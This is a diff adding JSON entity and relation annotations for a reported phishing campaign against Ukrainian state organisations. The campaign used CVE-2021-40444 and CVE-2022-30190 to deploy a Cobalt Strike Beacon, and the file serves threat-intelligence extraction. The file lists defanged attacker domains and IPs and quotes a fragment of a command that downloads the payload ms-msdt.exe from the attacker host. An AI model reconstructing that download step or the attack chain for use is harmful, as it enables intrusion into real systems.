@@ -1,0 +1,81 @@
+{
+  "entities": [
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A country in Eastern Europe whose state organizations were targeted in the attack."
+    },
+    {
+      "name": "зміни оплата праці з нарахуваннями.docx",
+      "kind": "malicious file",
+      "gloss": "A malicious Microsoft Word document distributed via email to target Ukrainian state organizations."
+    },
+    {
+      "name": "Good thing we disabled macros.html",
+      "kind": "malicious file",
+      "gloss": "A malicious HTML file containing JavaScript code used in the exploit chain."
+    },
+    {
+      "name": "CVE-2021-40444",
+      "kind": "vulnerability identifier",
+      "gloss": "A remote code execution vulnerability in the Microsoft MSHTML engine."
+    },
+    {
+      "name": "CVE-2022-30190",
+      "kind": "vulnerability identifier",
+      "gloss": "A remote code execution vulnerability in the Microsoft Support Diagnostic Tool (MSDT)."
+    },
+    {
+      "name": "ms-msdt.exe",
+      "kind": "malicious file",
+      "gloss": "A malicious executable payload downloaded during the attack to deploy Cobalt Strike Beacon."
+    },
+    {
+      "name": "Cobalt Strike Beacon",
+      "kind": "malware family",
+      "gloss": "A post-exploitation agent and penetration testing tool commonly abused by threat actors."
+    },
+    {
+      "name": "sdiagnhost.exe",
+      "kind": "software component",
+      "gloss": "A legitimate Microsoft Windows diagnostic host process abused during exploitation."
+    },
+    {
+      "name": "nod-update[.]it",
+      "kind": "internet domain",
+      "gloss": "A malicious domain used to host attack payloads including ms-msdt.exe."
+    },
+    {
+      "name": "185[.]64.106.39",
+      "kind": "ip address",
+      "gloss": "An IP address associated with the malicious server infrastructure."
+    }
+  ],
+  "relations": [
+    {
+      "head": "зміни оплата праці з нарахуваннями.docx",
+      "type": "exploits",
+      "tail": "CVE-2021-40444",
+      "evidence": "після експлуатації вразливостей CVE-2021-40444 та CVE-2022-30190"
+    },
+    {
+      "head": "зміни оплата праці з нарахуваннями.docx",
+      "type": "exploits",
+      "tail": "CVE-2022-30190",
+      "evidence": "після експлуатації вразливостей CVE-2021-40444 та CVE-2022-30190"
+    },
+    {
+      "head": "nod-update[.]it",
+      "type": "hosts",
+      "tail": "ms-msdt.exe",
+      "evidence": "DownloadFile('hXXps://nod-update[.]it/ms-msdt.exe'"
+    },
+    {
+      "head": "ms-msdt.exe",
+      "type": "delivers",
+      "tail": "Cobalt Strike Beacon",
+      "evidence": "ms-msdt.exe (Cobalt Strike Beacon)"
+    }
+  ],
+  "newRelationTypes": []
+}
